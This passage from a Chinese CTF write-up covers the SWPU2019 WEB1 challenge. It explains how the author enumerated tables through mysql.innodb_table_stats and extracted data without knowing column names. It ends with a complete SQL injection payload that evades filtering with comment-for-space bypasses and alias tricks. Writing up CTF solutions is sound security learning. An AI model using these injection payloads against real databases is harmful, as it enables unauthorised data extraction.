<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br><span class="line">sys.schema_auto_increment_columns</span><br></pre></td></tr></table></figure>

<p>可以构造</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats</span><br></pre></td></tr></table></figure>

<p>查询到我们需要使用的表</p>
<p>接下来的列怎么办，没办法知道他的列名：</p>
<p>实在没办法查询了一下大佬们的wp</p>
<p>发现需要用无列名查询</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line"></span><br><span class="line">https://www.jianshu.com/p/dc9af4ca2d06</span><br><span class="line"></span><br><span class="line">https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">查询全部列名的一般方法：</span><br><span class="line">select * from users</span><br><span class="line"></span><br><span class="line">假设有6列</span><br><span class="line">select 1,2,3,4,5,6 union select * from users</span><br><span class="line"></span><br><span class="line">列名就会以数字标号,因为是*所以他会以1-6来排序</span><br><span class="line"></span><br><span class="line">如果需要提取其中某一列，可以用反引号标注出列号(最后需要添加任意字符串ps:不知道为啥)</span><br><span class="line"></span><br><span class="line">假设我们需要查询第四列的数据我们就可以输入</span><br><span class="line">select `4` from （select 1，2，3，4，5，6 union select * from users)a</span><br></pre></td></tr></table></figure>

<p>但是这一题反引号被过滤了</p>
<p>所以我们需要找别的方法，发现as可以替代反引号的功效</p>
<p>上面的方法可以改成</p>
<p><code>select a fron (select 1,2,3,4 as a,5,6 union select * fron users)a</code></p>
<p>最后我们直接构造payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/06/SWPU2019-WEB1/7.PNG" alt="1"></p>
<p>拿到flag</p>
]]></content>
      <tags>
        <tag>SWPU2019</tag>
      </tags>
  </entry>
</search>
